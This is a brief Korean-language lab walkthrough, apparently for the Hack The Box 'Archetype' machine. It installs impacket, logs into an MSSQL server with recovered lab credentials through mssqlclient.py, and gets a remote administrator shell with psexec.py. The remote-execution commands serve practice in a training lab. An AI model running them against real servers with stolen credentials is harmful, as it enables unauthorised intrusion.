impacket은 네트워크 프로토콜 작업을 위한 파이썬 클래스 모음입니다.
#
`set up`
```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

#

![image](https://user-images.githubusercontent.com/61821641/148950112-b2d5f951-4566-49b0-ae91-4ac42e9315b1.png)

위에서 얻은 password(M3g4c0rp123), user id(ARCHETYPE/sql_svc)로 mssql 서버에 접속

```
┌──(root💀kali)-[~/Downloads/git-repo/impacket/examples]
└─# python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.12.10 -windows-auth      
```

![image](https://user-images.githubusercontent.com/61821641/148949361-07103b7d-1c0e-4c03-85b8-4f39e3eb1355.png)

#
`psexec.py`
```
┌──(root💀kali)-[~/Downloads/git-repo/impacket/examples]
└─# python3 psexec.py administrator@10.129.12.10       
```

#
reference

- [github](https://github.com/SecureAuthCorp/impacket)
- [_](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)


